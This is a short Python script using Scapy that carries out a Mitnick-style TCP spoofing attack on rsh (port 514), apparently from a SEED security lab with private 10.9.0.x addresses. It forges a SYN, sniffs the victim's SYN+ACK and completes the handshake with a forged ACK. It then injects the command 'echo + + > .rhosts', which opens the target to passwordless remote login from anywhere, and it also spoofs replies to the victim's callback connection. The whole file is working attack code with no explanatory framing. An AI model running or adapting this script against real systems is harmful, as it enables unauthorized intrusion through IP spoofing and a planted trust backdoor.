#!/usr/bin/python3
from scapy.all import *
tcp = TCP()
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp.sport = 1023
tcp.dport = 514
tcp.flags = "S"
tcp.seq = 0x2000
package = ip/tcp
send(package)

def spoof(pkt):
    if pkt[TCP].flags == "SA":# Check whether it is a SYN+ACK packet or not;
        tcp = TCP()
        tcp.sport = 1023
        tcp.dport = 514
        tcp.flags = "A"
        tcp.window = pkt[TCP].window
        tcp.seq = pkt[TCP].ack
        tcp.ack = pkt[TCP].seq + 1
        data = '9090\x00seed\x00seed\x00echo + + > .rhosts\x00'
        package = ip/tcp/data
        send(package)
    elif pkt[TCP].flags == "S":
        tcp = TCP()
        tcp.flags = "SA"
        tcp.sport = pkt[TCP].dport
        tcp.dport = pkt[TCP].sport
        tcp.seq = 0x1000
        tcp.ack = pkt[TCP].seq + 1
        package = ip/tcp
        send(package)

myFilter1 = 'src 10.9.0.5 and dst 10.9.0.6 and tcp' # You need to make the filter more specific
sniff(iface='br-169b92b58b54', filter=myFilter1, prn=spoof)

    
